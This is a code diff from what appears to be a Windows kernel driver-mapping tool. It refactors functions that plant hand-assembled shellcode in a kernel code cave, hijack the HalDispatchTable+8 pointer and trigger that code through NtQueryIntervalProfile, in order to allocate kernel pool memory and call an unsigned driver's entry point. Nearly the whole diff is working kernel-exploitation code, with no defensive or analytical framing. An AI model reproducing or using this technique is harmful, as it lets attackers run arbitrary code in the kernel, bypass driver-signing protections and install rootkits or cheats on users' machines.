@@ -252,7 +252,6 @@ PVOID KM_GetKernelExport(const char* name);
 BOOL KM_ProcessRelocations(PVOID imageBase, PVOID mappedBase, SIZE_T imageSize);
 BOOL KM_ResolveImports(PVOID imageBase);
 ULONG64 KM_FindCodeCave(SIZE_T needed);
-BOOL KM_ExecuteInKernel(ULONG64 funcAddr);
 ULONG64 KM_AllocateKernelPool(SIZE_T size);
 BOOL KM_CallDriverEntry(ULONG64 entryAddr);
 BOOL KM_MapDriverFromMemory(PVOID buffer, DWORD size);
@@ -1620,44 +1619,22 @@ ULONG64 KM_FindCodeCave(SIZE_T needed) {
     return cave;
 }
 
-BOOL KM_ExecuteInKernel(ULONG64 funcAddr) {
-    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
-    if (!ntdll) return FALSE;
-
-    pNtQueryIntervalProfile NtQIP =
-        (pNtQueryIntervalProfile)GetProcAddress(ntdll, "NtQueryIntervalProfile");
-    if (!NtQIP) return FALSE;
-
-    PVOID halDispatch = KM_GetKernelExport("HalDispatchTable");
-    if (!halDispatch) return FALSE;
-
-    ULONG64 halDispatch1Addr = (ULONG64)halDispatch + 8;
-
-    ULONG64 originalFunc = 0;
-    if (!KM_ReadKernelMemory(halDispatch1Addr, &originalFunc, sizeof(originalFunc)))
-        return FALSE;
-
-    if (!KM_WriteKernelMemory(halDispatch1Addr, &funcAddr, sizeof(funcAddr)))
-        return FALSE;
-
-    ULONG interval = 0;
-    NtQIP(2, &interval);
-
-    KM_WriteKernelMemory(halDispatch1Addr, &originalFunc, sizeof(originalFunc));
-    return TRUE;
-}
-
 ULONG64 KM_AllocateKernelPool(SIZE_T size) {
     PVOID pExAllocatePool = KM_GetKernelExport("ExAllocatePoolWithTag");
     if (!pExAllocatePool) return 0;
 
-    ULONG64 codeCave = KM_FindCodeCave(128);
+    PVOID halDispatch = KM_GetKernelExport("HalDispatchTable");
+    if (!halDispatch) return 0;
+    ULONG64 halD1 = (ULONG64)halDispatch + 8;
+
+    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+    if (!ntdll) return 0;
+    pNtQueryIntervalProfile NtQIP =
+        (pNtQueryIntervalProfile)GetProcAddress(ntdll, "NtQueryIntervalProfile");
+    if (!NtQIP) return 0;
+
+    ULONG64 codeCave = KM_FindCodeCave(80);
     if (!codeCave) return 0;
-
-    ULONG64 resultAddr = codeCave + 80;
-
-    ULONG64 zero = 0;
-    KM_WriteToReadOnlyMemory(resultAddr, &zero, sizeof(zero));
 
     unsigned char sc[] = {
         0x53,                                           // push rbx
@@ -1670,7 +1647,7 @@ ULONG64 KM_AllocateKernelPool(SIZE_T size) {
         0x48, 0xB8,                                     // mov rax, imm64 (ExAllocatePoolWithTag)
         0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
         0xFF, 0xD0,                                     // call rax
-        0x48, 0xBB,                                     // mov rbx, imm64 (result store)
+        0x48, 0xBB,                                     // mov rbx, imm64 (HalDispatchTable+8, writable .data)
         0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
         0x48, 0x89, 0x03,                              // mov [rbx], rax
         0x48, 0x83, 0xC4, 0x20,                        // add rsp, 0x20
@@ -1682,27 +1659,42 @@ ULONG64 KM_AllocateKernelPool(SIZE_T size) {
     *(ULONG64*)(sc + 10) = (ULONG64)size;
     *(ULONG64*)(sc + 20) = (ULONG64)0x6B63614D;
     *(ULONG64*)(sc + 30) = (ULONG64)pExAllocatePool;
-    *(ULONG64*)(sc + 42) = resultAddr;
+    *(ULONG64*)(sc + 42) = halD1;
 
     if (!KM_WriteToReadOnlyMemory(codeCave, sc, sizeof(sc)))
         return 0;
 
-    if (!KM_ExecuteInKernel(codeCave))
+    ULONG64 originalFunc = 0;
+    if (!KM_ReadKernelMemory(halD1, &originalFunc, sizeof(originalFunc)))
         return 0;
 
+    if (!KM_WriteKernelMemory(halD1, &codeCave, sizeof(codeCave)))
+        return 0;
+
+    ULONG interval = 0;
+    NtQIP(2, &interval);
+
     ULONG64 poolAddr = 0;
-    KM_ReadKernelMemory(resultAddr, &poolAddr, sizeof(poolAddr));
+    KM_ReadKernelMemory(halD1, &poolAddr, sizeof(poolAddr));
+
+    KM_WriteKernelMemory(halD1, &originalFunc, sizeof(originalFunc));
 
     return poolAddr;
 }
 
 BOOL KM_CallDriverEntry(ULONG64 entryAddr) {
-    ULONG64 codeCave = KM_FindCodeCave(128);
-    if (!codeCave) return FALSE;
+    PVOID halDispatch = KM_GetKernelExport("HalDispatchTable");
+    if (!halDispatch) return FALSE;
+    ULONG64 halD1 = (ULONG64)halDispatch + 8;
 
-    ULONG64 resultAddr = codeCave + 80;
-    ULONG64 zero = 0;
-    KM_WriteToReadOnlyMemory(resultAddr, &zero, sizeof(zero));
+    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+    if (!ntdll) return FALSE;
+    pNtQueryIntervalProfile NtQIP =
+        (pNtQueryIntervalProfile)GetProcAddress(ntdll, "NtQueryIntervalProfile");
+    if (!NtQIP) return FALSE;
+
+    ULONG64 codeCave = KM_FindCodeCave(80);
+    if (!codeCave) return FALSE;
 
     unsigned char sc[] = {
         0x53,                                           // push rbx
@@ -1712,7 +1704,7 @@ BOOL KM_CallDriverEntry(ULONG64 entryAddr) {
         0x48, 0xB8,                                     // mov rax, imm64 (DriverEntry)
         0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
         0xFF, 0xD0,                                     // call rax
-        0x48, 0xBB,                                     // mov rbx, imm64 (result store)
+        0x48, 0xBB,                                     // mov rbx, imm64 (HalDispatchTable+8, writable .data)
         0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
         0x48, 0x89, 0x03,                              // mov [rbx], rax
         0x48, 0x83, 0xC4, 0x20,                        // add rsp, 0x20
@@ -1722,16 +1714,25 @@ BOOL KM_CallDriverEntry(ULONG64 entryAddr) {
     };
 
     *(ULONG64*)(sc + 13) = entryAddr;
-    *(ULONG64*)(sc + 25) = resultAddr;
+    *(ULONG64*)(sc + 25) = halD1;
 
     if (!KM_WriteToReadOnlyMemory(codeCave, sc, sizeof(sc)))
         return FALSE;
 
-    if (!KM_ExecuteInKernel(codeCave))
+    ULONG64 originalFunc = 0;
+    if (!KM_ReadKernelMemory(halD1, &originalFunc, sizeof(originalFunc)))
         return FALSE;
 
+    if (!KM_WriteKernelMemory(halD1, &codeCave, sizeof(codeCave)))
+        return FALSE;
+
+    ULONG interval = 0;
+    NtQIP(2, &interval);
+
     ULONG64 ntStatus = 0;
-    KM_ReadKernelMemory(resultAddr, &ntStatus, sizeof(ntStatus));
+    KM_ReadKernelMemory(halD1, &ntStatus, sizeof(ntStatus));
+
+    KM_WriteKernelMemory(halD1, &originalFunc, sizeof(originalFunc));
 
     return ((LONG)ntStatus >= 0);
 }
